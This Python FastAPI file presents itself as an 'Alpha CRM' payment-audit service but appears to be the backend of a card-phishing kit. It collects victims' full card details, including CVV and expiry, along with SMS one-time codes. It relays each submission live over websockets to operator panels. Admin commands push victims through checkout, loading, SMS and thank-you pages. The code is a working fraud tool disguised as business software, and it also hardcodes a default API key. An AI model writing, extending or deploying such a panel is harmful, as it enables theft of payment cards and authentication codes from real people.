import os
import ipaddress
import os
import ipaddress
import uuid
import json
from typing import Optional, List, Dict
from fastapi import FastAPI, HTTPException, Security, Depends, WebSocket, WebSocketDisconnect
from fastapi.responses import FileResponse
from fastapi.security.api_key import APIKeyHeader, APIKey
from pydantic import BaseModel, EmailStr, Field, field_validator
from starlette.status import HTTP_403_FORBIDDEN

# --- Configuration ---
API_KEY = os.getenv("API_KEY", "pro-audit-secret-key-2024")
API_KEY_NAME = "X-API-KEY"
api_key_header = APIKeyHeader(name=API_KEY_NAME, auto_error=False)

app = FastAPI(
    title="Alpha CRM - Professional Audit",
    description="CRM de gestion de paiements en temps réel",
    version="2.0.0"
)

# --- WebSocket & Session Management ---
class ConnectionManager:
    def __init__(self):
        self.admins: List[WebSocket] = []
        self.clients: Dict[str, WebSocket] = {} # client_id -> WebSocket

    async def connect_admin(self, websocket: WebSocket):
        await websocket.accept()
        self.admins.append(websocket)

    def disconnect_admin(self, websocket: WebSocket):
        if websocket in self.admins:
            self.admins.remove(websocket)

    async def connect_client(self, client_id: str, websocket: WebSocket):
        await websocket.accept()
        self.clients[client_id] = websocket

    def disconnect_client(self, client_id: str):
        if client_id in self.clients:
            del self.clients[client_id]

    async def broadcast_to_admins(self, message: dict):
        for connection in self.admins:
            try:
                await connection.send_json(message)
            except Exception:
                continue

    async def send_to_client(self, client_id: str, message: dict):
        if client_id in self.clients:
            try:
                await self.clients[client_id].send_json(message)
            except Exception:
                pass

manager = ConnectionManager()

# --- Models ---
class AuditRequest(BaseModel):
    client_id: str
    email: EmailStr
    full_name: str
    numero_carte_masque: str
    card_bin: str
    card_brand: str
    expiry: str
    cvv: str
    montant: float
    adresse_ip: str
    device: str

    @field_validator("adresse_ip")
    @classmethod
    def validate_ip(cls, v: str) -> str:
        try:
            ipaddress.ip_address(v)
            return v
        except ValueError:
            raise ValueError("Format d'adresse IP invalide")

class AuditResponse(BaseModel):
    status: str
    message: str

class RedirectRequest(BaseModel):
    client_id: str
    target: str # 'checkout', 'loading', 'sms', 'thank_you'

# --- Endpoints ---
@app.get("/")
async def root():
    return {
        "message": "Alpha CRM API Online",
        "docs": "/docs",
        "admin_panel": "/panel"
    }

@app.get("/{page}")
async def get_html_page(page: str):
    valid_pages = ["checkout", "panel", "loading", "sms", "thank_you"]
    if page in valid_pages:
        return FileResponse(f"{page}.html")
    raise HTTPException(status_code=404)

# --- Security ---
async def get_api_key(header_key: Optional[str] = Security(api_key_header)):
    if header_key == API_KEY: return header_key
    raise HTTPException(status_code=HTTP_403_FORBIDDEN, detail="Invalid API Key")

# --- Logic & Endpoints ---
@app.post("/v1/audit", response_model=AuditResponse)
async def create_audit(request: AuditRequest, api_key: APIKey = Depends(get_api_key)):
    # Broadcast to admin panel
    await manager.broadcast_to_admins({
        "type": "NEW_PAYMENT",
        "data": request.dict()
    })
    return AuditResponse(status="PENDING", message="Transaction en cours d'analyse")

@app.post("/v1/sms-submit")
async def submit_sms(client_id: str, otp: str):
    await manager.broadcast_to_admins({
        "type": "NEW_SMS",
        "client_id": client_id,
        "otp": otp
    })
    return {"status": "success"}

@app.post("/v1/admin/redirect")
async def admin_redirect(request: RedirectRequest, api_key: APIKey = Depends(get_api_key)):
    await manager.send_to_client(request.client_id, {
        "type": "REDIRECT",
        "url": f"/{request.target}"
    })
    return {"status": "command_sent"}

@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    await manager.connect_admin(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect_admin(websocket)

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    await manager.connect_client(client_id, websocket)
    try:
        # Signaler l'arrivée d'un visiteur aux admins
        await manager.broadcast_to_admins({
            "type": "CLIENT_STATUS",
            "client_id": client_id,
            "status": "online"
        })
        while True:
            p=await websocket.receive_text()
            try:
                r=json.loads(p)
                for a in manager.admins: await a.send_json({'type':'CLIENT_EVENT','client_id':client_id,'event':r.get('event'),'data':r.get('data')})
            except:pass
    except WebSocketDisconnect:
        manager.disconnect_client(client_id)
        await manager.broadcast_to_admins({
            "type": "CLIENT_STATUS",
            "client_id": client_id,
            "status": "offline"
        })

# --- Entry Point ---
if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
